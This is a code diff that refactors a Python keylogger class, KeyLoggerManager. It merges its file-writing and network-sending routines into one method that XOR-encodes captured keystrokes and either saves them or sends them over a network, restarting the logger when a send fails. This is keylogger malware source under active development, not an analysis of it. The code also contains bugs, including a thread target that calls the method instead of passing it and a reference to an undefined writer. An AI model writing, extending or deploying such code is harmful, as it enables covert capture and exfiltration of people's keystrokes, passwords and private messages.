@@ -30,18 +30,17 @@ class KeyLoggerManager:
             True
         return
 
-    def write_to_file(self):
+    def write_data(self):
         while self.instance.return_action():
-
-            self.writer.write(self.xor_encryption())
-            time.sleep(3)
-
-    def write_to_network(self):
-        while self.instance.return_action():
-            stop_key_looger = writer.write(self.xor_encryption())
-            if not (stop_key_looger):
-                self.instance.start()
-            time.sleep(10)
+            encrypted_data = self.xor_encryption()
+            if self.mode == "network":
+                stop_key_logger = writer.write(encrypted_data)
+                if not stop_key_logger:
+                    self.instance.start()
+                time.sleep(10)
+            else:
+                self.writer.write(encrypted_data)
+                time.sleep(3)
 
 
     def xor_encryption(self):
@@ -51,14 +50,7 @@ class KeyLoggerManager:
     def main(self):
         threading.Thread(target=self.start).start()
         time.sleep(0.1)
-
-        if self.mode  == "network":
-            threading.Thread(target=self.write_to_network()).start()
-            time.sleep(0.1)
-        else:
-            threading.Thread(target=self.write_to_file()).start()
-            time.sleep(0.1)
-
+        threading.Thread(target=self.write_data()).start()
 
 
 
